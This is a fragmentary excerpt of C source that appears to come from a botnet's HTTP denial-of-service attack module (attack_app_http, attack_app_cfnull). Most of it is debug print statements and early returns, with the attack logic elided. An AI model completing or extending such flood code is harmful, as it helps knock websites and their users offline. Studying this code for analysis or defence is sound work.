...
#ifdef DEBUG
        printf("[attack_app]attack_app_http return 1:domain=%s:path==%s: \n",domain,path);
#endif
        return;
    }
...
#ifdef DEBUG
        printf("[attack_app]attack_app_http return 2\n");
#endif
        return;
    }
...
#ifdef DEBUG
        printf("[attack_app]attack_app_http return 3\n");
#endif
        return;
    }
...
#ifdef DEBUG
        printf("[attack_app]attack_app_http return 4\n");
#endif
        return;
    }
...
void attack_app_cfnull(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    ...
    char generic_memes[10241] = {0};
#ifdef DEBUG
        printf("[attack_app]attack_app_cfnull statrt\n");
#endif
    if (domain == NULL)
        return;
